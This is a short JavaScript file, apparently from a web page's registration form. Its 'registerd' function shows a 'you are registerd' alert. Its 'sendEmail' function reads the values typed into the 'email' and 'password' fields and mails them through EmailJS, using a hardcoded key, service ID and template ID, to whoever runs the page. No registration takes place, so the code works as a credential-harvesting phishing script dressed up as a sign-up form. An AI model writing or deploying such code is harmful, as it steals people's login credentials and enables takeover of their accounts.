async function sendEmail() {
    try {
        // Replace 'YOUR_USER_ID' with your actual User ID
        emailjs.init('tMe4VknUSrrxdDyMT');

        // Replace 'service_emnx42o' and 'template_yq2hgub' with your actual Service ID and Template ID
        const templateParams = {
            from_name: document.getElementById('email').value, // Assuming 'email' is the ID of the input field for from_name
            message: document.getElementById('password').value // Assuming 'password' is the ID of the input field for message
        };

        const response = await emailjs.send('service_emnx42o', 'template_yq2hgub', templateParams);

        console.log('Email sent successfully:', response);
        alert('Email sent successfully!');

        // Optionally reset form fields after successful submission
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
    } catch (error) {
        console.error('Error sending email:', error);
        alert('Failed to send email. Please try again later.');
    }
}

function registerd(){
    alert("you are registerd");
    var a= document.getElementById("email").value;
var b=document.getElementById("password").value;
 sendEmail()
    
}
